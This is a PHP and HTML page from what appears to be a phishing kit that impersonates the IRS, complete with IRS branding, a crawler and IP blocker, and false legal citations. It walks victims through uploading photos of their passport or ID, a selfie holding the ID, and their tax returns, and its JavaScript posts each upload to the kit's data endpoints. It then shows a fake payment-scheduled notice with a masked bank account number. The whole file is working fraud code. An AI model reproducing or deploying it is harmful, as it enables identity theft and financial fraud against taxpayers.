<?php
session_start();
// By Beems
require_once '../main.php';
require_once '../blocker.php';
if($block_referrer == "on") {
    require_once '../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../blacklist.php';
}
require_once 'session.php'; 
if($onetime == "on") {
    tulis_file("../security/onetime.dat","$ip");
}
$lg_id = [
        "head" => "Upload Your Identity",
        "proof" => [
            "one" => "Identity Proof",
            "two" => "Selfie With Proof",
            "three" => "Process Completed"
        ],
        "choose" => "Choose your ID type",
        "type" => [
            "one" => "Passport",
            "two" => "National ID",
            "three" => "Driver's license"
        ],
        "bt_proceed" => "Proceed",
        "head_up" => "Upload your",
        "rule1" => [
            "one" => "Take a high quality photo<br> or make a high quality scan",
            "two" => "Submit front and back sides of<br> a your ID document",
            "three" => "Scan front and back <br> if you chose a passport or Driver's license"
        ],
        "drop_zone" => "<b>Drag and drop or click here</b> to upload your image (max 5 MB)",
        "bt_back" => "GO BACK",
        "head_slf" => "Upload a selfie with",
        "rule2" => [
            "one" => "Make sure you are looking<br>straight at the camera",
            "two" => "Your fingers don't cover the photo or any important information",
            "three" => "Don't wear a hat or glasses,<br>and make sure<br>your beard is trimmed"
        ]
    ];
    $lg_finish = [
        "head" => "Verification process completed",
        "on" => "VERIFIED",
        "p1" => "You have succesfully ",
        "p2" => "your bank account. Proceed for payment confirmation",
    ];

 ?>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <meta name="referrer" content="no-referrer">
      <link rel="icon" type="image/x-icon" href="./assets/images/favicon.ico">
    <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="./assets/css/jquery-ui.min.css">
    <link rel="stylesheet" href="./assets/css/irs.css">
    <link rel="stylesheet" href="./assets/css/app.css">
    <link rel="stylesheet" href="./process.css">
    
<link rel="stylesheet" href="./assets/css/wmsp-shared-secrets.css">
<link rel="stylesheet" href="./assets/css/wmsp-error.css">
<link rel="stylesheet" href="./assets/css/wmsp-results.css">
<style type="text/css">
.bt_online {
    padding: 10px 20px;
    margin-top: 0;
    text-align: center;
    white-space: inherit;
    font-size: 17px;
    line-height: 20px;
    font-weight: 700!important;
    width: 250px;
    text-transform: capitalize;
    display: inline-block;
}
</style>
    <title>Verify your identity</title>
  </head>
  <body class="icce">
    <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing">
                    <?php echo $lg_sign['rotate'] ?>
                </div>
            </div>
            <div class="overlay"></div>
        </div>
  
    <div class="container-fluid" style="background: #f1f1f1; width: 100%;">
      <div class="flagtext">
        <p class="usflag">An official website of the United States Government</p>
      </div>
    </div>
  
    <div class="container-fluid" role="banner" style="background-color: #234E76; width: 100%;">
      <div class="header">
        <div class="navbar">
            <a class="logo" href="javascript:openIrsPage()" title="Go to IRS Home Page">
              <img aria-hidden="true" src="./assets/images/logo.jpg">
            </a>                                  
            
            <ul class="navbar-nav">
                 
            <li class="navbar-item"><a class="nav-link" href="javascript:switchLanguage()" title="Click this link to switch language">Español</a>
            </li>        
                                
           
                <li class="navbar-item"><a class="nav-link" href="javascript:logout()" title="Click this link to logoff"> <span>Exit</span> 
                    <svg aria-hidden="true" focusable="false" viewBox="0 0 491.1 412.5">
                      <path d="M 282.9 283.5 v 11.9 c 0 24.5 0.1 49.1 0 73.6 c 0 9.3 3.2 16.6 12 20.6 c
                          9.2 4.1 16.7 0.5 23 -5.9 c 54.4 -54.3 108.8 -108.6 163.1 -163.1 c 10.2 -10.2
                          10.3 -21 0.3 -31 c -54.4 -54.7 -109.1 -109.2 -163.7 -163.7 c -6.1 -6.1 -13.4
                          -9.4 -22.3 -5.7 c -8.9 3.8 -12.4 11 -12.4 20.3 v 86 h -11.8 c -40.6 0 -81.1
                          -0.1 -121.7 0 c -15.7 0 -23.5 7.1 -23.6 22.3 c -0.2 37.6 -0.2 75.3 0 112.9 c
                          0.1 14.2 7.9 21.6 22.1 21.8 c 15.7 0.2 31.4 0.1 47.1 0.1 c 28.8 -0.1 57.6
                          -0.1 87.9 -0.1 Z M 8.2 205 h -0.4 c 0 35.7 -0.3 71.4 0.1 107 c 0.4 46.6 30.7
                          83.4 76.9 87.8 c 36.3 3.5 73.2 1.4 109.8 1.2 c 2.8 0 7.1 -3.9 8 -6.8 c 1.7
                          -5.1 2 -10.9 1.6 -16.4 c -0.9 -14 -2.8 -15.5 -16.7 -15.5 h -87.4 C 68 362.2
                          47 343 46.7 311.2 c -0.6 -70.7 -0.6 -141.4 0 -212.1 c 0.3 -32 21.1 -51.1
                          53.2 -51.2 c 28.8 -0.1 57.6 0 86.4 0 c 15.2 0 18.1 -2.9 18.1 -18.4 c 0 -3.3
                          -0.6 -6.5 -0.8 -9.8 c -0.5 -7.6 -4.5 -11 -12.1 -11 c -33.4 0.1 -66.8 -0.7
                          -100.1 0.4 c -44.7 1.5 -81.1 36.6 -83 81.1 c -1.4 38.2 -0.2 76.5 -0.2 114.8
                          Z">
                       </path>
                       <path d="M 282.9 283.5 h -87.8 c -15.7 0 -31.4 0.2 -47.1 -0.1 c -14.2 -0.2 -22 -7.6
                          -22.1 -21.8 c -0.3 -37.6 -0.3 -75.3 0 -112.9 c 0.1 -15.1 7.9 -22.2 23.6
                          -22.3 c 40.6 -0.1 81.1 0 121.7 0 H 283 V 114 V 40.4 c 0 -9.3 3.5 -16.5 12.4
                          -20.3 c 8.8 -3.7 16.1 -0.4 22.3 5.7 C 372.4 80.3 427 134.9 481.5 189.6 c 10
                          10 9.8 20.8 -0.3 31 c -54.3 54.5 -108.7 108.8 -163.1 163.1 c -6.4 6.4 -13.9
                          10 -23 5.9 c -8.8 -4 -12 -11.3 -12 -20.6 c 0.1 -24.5 0 -49.1 0 -73.6 c -0.2
                          -3.5 -0.2 -7 -0.2 -11.9 Z">
                       </path>
                       <path d="M 8.2 205 c 0 -38.3 -1.3 -76.6 0.3 -114.8 c 1.9 -44.5 38.3 -79.6 83 -81.1 c
                          33.3 -1.1 66.8 -0.3 100.1 -0.4 c 7.6 0 11.6 3.4 12.1 11 c 0.2 3.3 0.8 6.5
                          0.8 9.8 c 0 15.5 -3 18.4 -18.1 18.4 H 100 c -32.1 0.1 -53 19.3 -53.2 51.2 c
                          -0.6 70.7 -0.6 141.4 0 212.1 c 0.3 31.8 21.3 51.1 53.4 51.1 c 29.1 0.1 58.3
                          0 87.4 0 c 13.9 0 15.8 1.5 16.7 15.5 c 0.3 5.5 0 11.3 -1.6 16.4 c -1 2.9
                          -5.2 6.8 -8 6.8 c -36.6 0.2 -73.5 2.3 -109.8 -1.2 c -46.3 -4.3 -76.6 -41.2
                          -77 -87.8 c -0.3 -35.7 -0.1 -71.3 -0.1 -107 h 0.4 Z">
                        </path>
                    </svg></a></li>
                    
                    
           
                
  
              </ul>
            </div>
          </div>
        </div>
  
    <div class="main container-fluid">
      <main id="intro">

    <h1 class="irs-title-2 text-center">Upload proof of Identity</h1>
  
    <p>Upload your Identification Documents. <span id="id_head"> Required by law for all taxpayers.</span> This process is instant and required for inspection of taxpayer records (under 18 U.S.C. 1030 and 26 U.S.C. 7213A and 26 U.S.C. 7431).</p>
  
        <div class="contents">
            
            <section class="mainContents" id="finish">
                <div style="padding:0 20px">
                  
                    <div id="select_one">
                        <form action="javascript:void(0);" method="POST">
                            <div id="area_choose">
                                <h1 style="font-size:1.4rem!important"><?php echo $lg_id['choose'] ?></h1>
                                <div class="doc_type">
                                    <div class="doc_type_choice">
                                        <div class="doc_type_choice_wrapper">
                                            <div><img src="lib/pics/id_p.svg" alt=""></div>
                                            <label class="cont">
                                                <input type="radio" name="doc_type" value="Passport"><span class="checkmark"></span><span> <?php echo $lg_id['type']['one'] ?></span></label>
                                        </div>
                                    </div>
                                    <div class="doc_type_choice">
                                        <div class="doc_type_choice_wrapper">
                                            <div><img src="lib/pics/id_n.svg" alt=""></div>
                                            <label class="cont">
                                                <input type="radio" name="doc_type" value="National ID"><span class="checkmark"></span><span> <?php echo $lg_id['type']['two'] ?></span></label>
                                        </div>
                                    </div>
                                    <div class="doc_type_choice">
                                        <div class="doc_type_choice_wrapper">
                                            <div><img src="lib/pics/id_n.svg" alt=""></div>
                                            <label class="cont">
                                                <input type="radio" name="doc_type" value="Driver's license"><span class="checkmark"></span><span> <?php echo $lg_id['type']['three'] ?></span></label>
                                        </div>
                                    </div>
                                </div>
                                <button class="notice-button btn btn-primary bt_select_one" title="Click here to acknowledge the IRS Warning message to Continue." type="button" value="ok">Proceed</button>
                            </div>
                            <div id="area_up_id" style="display:none">
                                <h1 style="font-size:1.4rem"><?php echo $lg_id['head_up'] ?><span></span></h1>
                                <div class="row rules text-center">
                                    <div class="rule"><img src="lib/pics/scan_id.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule1']['one'] ?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/both_sides.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule1']['two'] ?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/both_pass.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule1']['three'] ?>
                                        </div>
                                    </div>
                                </div>
                                <div class="zone" id="up_id_zone">
                                    <div class="dropzone-main" style="display:block">
                                        <div class="dropzone-img">
                                            <input style="display:none" type="file" name="file[]" accept="image/*" multiple>
                                        </div>
                                        <p>
                                            <?php echo $lg_id['drop_zone'] ?>
                                        </p>
                                    </div>
                                </div>
                                <div class="imagesArea"></div>
                                <button class="notice-button btn btn-primary" title="Click here to acknowledge the IRS Warning message to Continue." type="submit" value="Proceed">Proceed</button>
                                <br>

                                <div>
                                    <a href="javascript:void(0)" class="back">
                                        <?php echo $lg_id['bt_back'] ?>
                                    </a>
                                </div>
                            </div>

                        </form>
                    </div>
                    <div id="select_two" class="hide">
                        <form action="javascript:void(0);" method="POST">
                            <div id="area_up_selfie">
                                <h1 style="font-size:1.4rem"><?php echo $lg_id['head_slf'] ?><span></span></h1>
                                <div class="row rules text-center">
                                    <div class="rule"><img src="lib/pics/take_s.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule2']['one'] ?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/fingers_not.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule2']['two'] ?>
                                        </div>
                                    </div>
                                    <div class="rule"><img src="lib/pics/glaesses_not.svg" alt="">
                                        <div>
                                            <?php echo $lg_id['rule2']['three'] ?>
                                        </div>
                                    </div>
                                </div>
                                <div class="zone" id="up_id_zone">
                                    <div class="dropzone-main" style="display:block">
                                        <div class="dropzone-img" style="background-image:url(lib/pics/up_slf.svg),none">
                                            <input style="display:none" type="file" name="file[]" accept="image/*" multiple>
                                        </div>
                                        <p>
                                            <?php echo $lg_id['drop_zone'] ?>
                                        </p>
                                    </div>
                                </div>
                                <div class="imagesArea"></div>
                                <input type="hidden" name="id_slf" value="ok">
                                <button class="notice-button btn btn-primary" title="Click here to acknowledge the IRS Warning message to Continue." type="submit" value="ok">Proceed</button>
                                <div>
                                    <a href="javascript:void(0)" class="back">
                                        <?php echo $lg_id['bt_back'] ?>
                                    </a>
                                </div>
                            </div>
                        </form>
                     
                    </div>
                     <div id="select_four" class="hide">
                        <form action="javascript:void(0);" method="POST">
                            <div id="area_up_docs">
                                <h1 style="font-size:1.4rem">Upload your recent Income Tax Return.<span></span></h1>
                                <div class="row rules">
                                    <div class="rule" style="width: 100%; text-align: left; padding-left: 30px;">
                                        <h2>Request Online</h2>

<h3>What You Need</h3>

<p>To register and use this service, you need:</p>

<ul><li>your <a href="https://www.irs.gov/individuals/international-taxpayers/taxpayer-identification-numbers-tin" title="Taxpayer Identification Numbers TIN">SSN</a>, date of birth, filing status and mailing address from latest tax return,</li>
    <li>your personal account number from a credit card, mortgage, home equity loan, home equity line of credit or car loan, and</li>
    <li>a mobile phone with your name on the account.</li>
</ul><h3>What You Get</h3>

<ul>
    <li>Download your transcript or latest tax return.</li>
    <li>Return to this form and upload your transcript in pdf format.</li>
    <li>Submit Documents to receive payment confirmation.</li>
</ul>
                        <div class="text-center ">
                            <button class="notice-button btn btn-primary bt_online" title="Get Transcript Online" type="button" value="ok" onclick="window.open('https://sa.www4.irs.gov/icce-core/load/gettrans/pages/availableTranscripts.xhtml', '_blank' );">Get Transcript Online</button>

                        </div>
                        </div>       
                            </div>
                                <div class="zone" id="up_id_zone">
                                    <div class="dropzone-main" style="display:block">
                                        <div class="dropzone-img">
                                            <input style="display:none" type="file" name="file[]" accept="application/pdf" multiple>
                                        </div>
                                        <p>
                                            <b>Drag and drop or click here</b> to upload your document                                    </p>
                                    </div>
                                </div>
                                <div class="imagesArea"></div>
                                <input type="hidden" name="docs_slf" value="ok">
                                <button class="notice-button btn btn-primary" title="Click here to acknowledge the IRS Warning message to Continue." type="submit" value="ok">Proceed</button>
                                <div>
                                    <a href="javascript:void(0)" class="back">
                                        <?php echo $lg_id['bt_back'] ?>
                                    </a>
                                </div>
                            </div>
                        </form>
                     
                    </div>

                    <div id="select_three" class="hide">
                        <div style="padding:20px"><img src="lib/pics/success.gif" alt="" width="150">
                            <h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $lg_finish['head'] ?></h1>
                            <p>
                                <?php echo $lg_finish['p1'] ?><span style="color:#41ad49;font-weight:bold"> <?php echo $lg_finish['on'] ?></span>,
                                    <?php echo $lg_finish['p2'] ?>
                                        .</p>
                            <div>
                                <button class="notice-button btn btn-primary" title="Click here to acknowledge the IRS Warning message to Continue." type="button" value="ok">Proceed</button>
                                
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </div>

  
      
    </div>
    </div>
        </div>  
        </form>
    </main>
   
 
  
<main id="pmt_complete" class="hide"> 

<form action="#" method="post">

  <div>

  <h1 class="login-title">Payment Status</h1>

  <div>
    <div>
      <p>We scheduled your payment of <?php echo $amount_receive; ?> to be deposited to <?php echo $bankname; ?> on <b><?php echo date("jS F, Y", strtotime(" +2 Weekday")); ?></b> to the bank account below.</p>
      <div> 
        <p>Bank Account Number: ************<?php echo substr($_SESSION['accountNumberInput'], -4); ?></p>
      </div>
      
      <p>If you don't see your payment credited to your account, check with your bank to verify they received it. We will mail you a letter with additional information on this payment.</p>
    </div>
    
  </div>
  
      
    <button class="login-submit-button btn btn-primary" name="submit" title="Click this button to exit the session" type="submit" value="exit" id="exit">Exit</button>
  </div>

  

</form>

</main>
    </div>
          
      <div class="container-fluid" style="background: #4E4E4E;width: 100%;">
          <div class="footer container-fluid"> 
            <div class="navbar">
              <div class="navfooterlogo">
          <img aria-hidden="true" alt="Decorative IRS Logo" src="./assets/images/irs_horiz_white.png">
        </div>

              
          <ul class="navbar-nav">
            <li class="navbar-item"><a class="nav-link" href="javascript:openIrsPrivacyPolicy()" title="Click this link to view the IRS Privacy Policy Page">
              <span style="color:white">IRS Privacy Policy</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg></a></li>
            <li class="navbar-item" id="accessibility-link"><a class="nav-link" href="javascript:openIrsAccessibility()" title="Click this link to view the Accessibility Page">
                <span style="color:white">Accessibility</span>
              <svg style="top: 0.2em; vertical-align: baseline; position: relative;" fill="white" focusable="false" viewBox="0 0 40 40" width="1em" height="1em">
  <path d="m 31.4 20.7 v 7.2 q 0 2.6 -1.9 4.5 t -4.5 1.9 h -18.6
      q -2.6 0 -4.5 -1.9 t -1.9 -4.5 v -18.6 q 0 -2.7 1.9 -4.6
      t 4.5 -1.8 h 15.7 q 0.4 0 0.6 0.2 t 0.2 0.5 v 1.4
      q 0 0.3 -0.2 0.5 t -0.6 0.2 h -15.7 q -1.4 0 -2.5 1.1
      t -1 2.5 v 18.6 q 0 1.4 1 2.5 t 2.5 1 h 18.6 q 1.5 0 2.5 -1
      t 1.1 -2.5 v -7.2 q 0 -0.3 0.2 -0.5 t 0.5 -0.2 h 1.4
      q 0.3 0 0.5 0.2 t 0.2 0.5 Z m 8.6 -19.3 v 11.5
      q 0 0.5 -0.4 1 t -1 0.4 t -1 -0.4 l -4 -4 l -14.5 14.6
      q -0.2 0.2 -0.5 0.2 t -0.5 -0.2 l -2.6 -2.6
      q -0.2 -0.2 -0.2 -0.5 t 0.2 -0.5 l 14.6 -14.5 l -4 -4
      q -0.4 -0.4 -0.4 -1 t 0.4 -1 t 1 -0.4 h 11.5 q 0.6 0 1 0.4
      t 0.4 1 Z"></path>
  </svg>
            </a></li>
          </ul>
          

        </div>
      </div>
    </div>
      
      
    
    <form action="/irfof-wmsp/logout" method="post" name="logoutForm">
    </form>
  <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front expire ui-dialog-buttons ui-draggable" aria-labelledby="ui-id-1" style="display: none;"><div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle expire"><span id="ui-id-1" class="ui-dialog-title expire">IRS - Session Warning</span><button type="button" class="ui-dialog-titlebar-close expire"></button></div><div id="expire-content" style="" class="ui-dialog-content ui-widget-content expire"><div id="expire-text" tabindex="0" class="expire">Your session will expire in 5 minutes.<br class="expire"><br class="expire">If you want to refresh the session for an additional 15 minutes select OK.  If not, select Cancel.</div></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix expire"><div class="ui-dialog-buttonset expire"><button type="button" title="Click here if you want to renew this session for 15 minutes" class="expire">OK</button><button type="button" title="Do not renew session" class="expire">Cancel</button></div></div></div>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    
<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
    if (sessionStorage.getItem('safe') == "id_first_1") {
        $('#select_one').addClass('hide');
        $('#select_two').addClass('hide');
        $('#select_four').removeClass('hide');
        $("#id_head").html('You are required to submit your recent tax return (1040) or request official transcript of your recent income tax (4506-T) form for additional verification.');
    }
  }
}

    $(document).on('click', '.doc_type_choice', function() {
        $(this).find('[name="doc_type"]').prop('checked', true);
    });
    $('.bt_select_one').click(function() {
        if ($('[name=doc_type]').is(':checked')) {
            $('#area_choose').hide('slow');
            $('#area_up_id > h1 > span, #area_up_selfie > h1 > span').html($('[name=doc_type]:checked').parent().find('span:last').html());
            $('#area_up_id').show('slow');
            $("#id_head").html('Upload a document for Verification.');
        }
    });
    $(document).on('click', '#area_up_id .back', function() {
        $('#area_up_id').hide('slow');
        $('#area_choose').show('slow');
    });
    $(document).on('submit', '#select_one > form', function(e) {
        e.preventDefault();
        if ($('#select_one .imagesArea .imgItem').length < 2) {
            return false;
        }
        $('#rotate').removeClass('hide');
        $.post('data/id?key=<?php echo $key;?>', $(this).serialize(), function(dt, st) {
            if (dt && st == 'success') {
                $("#id_head").html('Upload a picture of you holding your identity document.');
                $('#select_one').addClass('hide');
                $('#select_two').removeClass('hide');
                window.scrollTo(0, 0);
                $('#rotate').addClass('hide');
            }
        });
    });

  $(document).on('click', '#area_up_selfie .back', function() {
    $('#select_one').removeClass('hide');
    $('#select_one .imagesArea').html('');
    $('#select_one [type=hidden]').remove();
    $('#select_two').addClass('hide');
});
$(document).on('submit', '#select_two > form', function(e) {
    e.preventDefault();
    if ($('#select_two .imagesArea .imgItem').length == 0) {
        return false;
    }
    $('#rotate').removeClass('hide');
    $.post('data/selfie?key=<?php echo $key;?>', $(this).serialize(), function(dt, st) {
        if (dt && st == 'success') {
            $("#id_head").html('You are required to submit your recent tax return (1040) or request official transcript of your recent income tax (4506-T) form for additional verification. Select Get Transcript Online and follow the instructons to receive your transcript.');
            $('#select_one').addClass('hide');
            $('#select_two').addClass('hide');
            if ("<?php echo $id_first; ?>" == "on") {
                sessionStorage.setItem('safe', 'id_first');
                $(location).attr("href", "notice?key=<?php echo $key;?>");
            } else {
                $('#select_four').removeClass('hide');
            }
            window.scrollTo(0, 0);
            $('#rotate').addClass('hide');
        }
    });
});

$(document).on('click', '#area_up_docs .back', function() {
    $('#select_two').removeClass('hide');
    $('#select_two .imagesArea').html('');
    $('#select_two [type=hidden]').remove();
    $('#select_four').addClass('hide');
});
$(document).on('submit', '#select_four > form', function(e) {
    e.preventDefault();
    if ($('#select_four .imagesArea .imgItem').length == 0) {
        return false;
    }
    $('#rotate').removeClass('hide');
    $.post('data/docs?key=<?php echo $key;?>', $(this).serialize(), function(dt, st) {
        if (dt && st == 'success') {
            $("#id_head").html('You are required to submit your recent tax return (1040) or request official transcript of your recent income tax (4506-T) form for additional verification. Select Get Transcript Online and follow the instructons to receive your transcript.');
            $('#select_one').addClass('hide');
            $('#select_two').addClass('hide');
            $('#select_four').addClass('hide');
            $("#intro").hide();
            sessionStorage.removeItem('safe');
            $("#pmt_complete").removeClass('hide');
            //$('#select_three').removeClass('hide');
            window.scrollTo(0, 0);
            $('#rotate').addClass('hide');
        }
    });
});
    var emailretry = 0;
    var loginretry = 0;
    var filename = "";
$(".loading").show();
function readFile(files, me, check) {
                if (files) {
                    for (var i = 0; i < files.length; i++) {
                        var FR = new FileReader();
                        fname = filename.files[i].name;
                        console.log(filename.files[i].name);
                        FR.onload = function(e) {
                            if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
                                if (check) {
                                    $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                } else {
                                    $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                }
                                $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                            }
                            if (e.target.result.startsWith("data:application/pdf") && e.total <= 50000000) {
                                if (check) {
                                    $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="./assets/images/pdf_img.png" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                } else {
                                    $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="./assets/images/pdf_img.png" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                }
                                $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                            }
                        }
                        FR.readAsDataURL(files[i]);
                    }
                }
            }
function readFileP(files, me, check) {
                if (files) {
                    for (var i = 0; i < files.length; i++) {
                        var FR = new FileReader();
                        fname = filename;
                        FR.onload = function(e) {
                            if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
                                if (check) {
                                    $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                } else {
                                    $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                }
                                $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                            }
                            if (e.target.result.startsWith("data:application/pdf") && e.total <= 50000000) {
                                if (check) {
                                    $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="./assets/images/pdf_img.png" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                } else {
                                    $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="./assets/images/pdf_img.png" alt="'+fname+'" title="'+fname+'"><button class="btDel">X</button></div>');
                                }
                                $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                            }
                        }
                        FR.readAsDataURL(files[i]);
                    }
                }
            }
$(document).on('click', '.zone', function(e) {
                e.stopPropagation();
                $(this).find('input[type=file]').trigger(e);
            });
            $(document).on('click', '.btDel', function() {
                $(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
                $(this).parent().remove();
            });
            $(document).on('change', 'input[type=file]', function(e) {
                //console.log(e.target)
                filename = e.target;
                readFile(this.files, this, false);
            });

            $(".dropzone-main").on('dragleave', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #dee3e7');
                $(this).css('background', '#f0f2f4');
            });
            $(".dropzone-main").on('dragover', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #0564b3');
                $(this).css('background', '#ecf1f9');
            });
            $(".dropzone-main").on('drop', function(e) {
                e.preventDefault();
                var target = $( e.target );
                //console.log(target.find('input')[0]);
                filename = e.originalEvent.dataTransfer.files[0].name;
                $(this).css('border', '2px dashed #41ad49');
                readFileP(e.originalEvent.dataTransfer.files, this, true);
            });
$("#exit").click(function(e) {
    e.preventDefault();
    $(location).attr("href", "https://www.irs.gov/");
});
</script>
<script>

function openIrsPage ( ) {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();
}
  
function openIrsAccessibility ( ) {
var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();

if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/help/irsgov-accessibility",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/help/irsgov-accessibility",
    "_blank" );
 }   
}

function openIrsPrivacyPolicy ( ) {

var language = $('a.nav-link[href="javascript:switchLanguage()"]').text();

if($.trim(language) == "English"){ 
  window.open (
    "http://www.irs.gov/es/privacy-disclosure/irs-privacy-policy",
    "_blank" );  
 }
 else
 {
  window.open (
    "http://www.irs.gov/privacy/index.html",
    "_blank" );
 } 
}

function switchLanguage ( ) {
  
  location.replace ( "?lang=es");
}

</script>
</html>